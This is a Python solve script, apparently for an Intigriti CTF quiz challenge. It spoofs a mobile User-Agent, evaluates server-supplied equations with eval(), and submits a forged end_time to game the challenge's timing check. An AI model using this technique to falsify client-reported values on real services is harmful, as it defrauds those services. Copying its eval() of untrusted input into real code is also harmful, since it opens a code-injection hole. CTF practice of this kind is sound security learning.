import requests
import json
import time

url = 'https://quiz.ctf.intigriti.io/'
start_url = f'{url}/start'
submit_url = f'{url}/submit'

start_time = int(time.time() * 1000)

json_object = {
    'start_time': start_time
}

headers = {'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}
response = requests.post(start_url, data=json.dumps(json_object), headers=headers)
status_code = response.status_code

if 200 <= status_code < 300:
    print(f'Successfully started the game')
    
    response_json = response.json()
    game_id = response_json['game_id']
    equations = response_json['equations']

    equation_sum = 0
    for i in range(len(equations)):
        equation = equations[i]
        equation_sum += eval(equation)

    json_object = {
        'game_id': game_id,
        'end_time': str(start_time + equation_sum)
    }

    response = requests.post(submit_url, data=json.dumps(json_object), headers=headers)
    status_code = response.status_code
    if 200 <= status_code < 300:
        print(f'Successfully submitted the game')
        
        response_json = response.json()
        print(response_json)
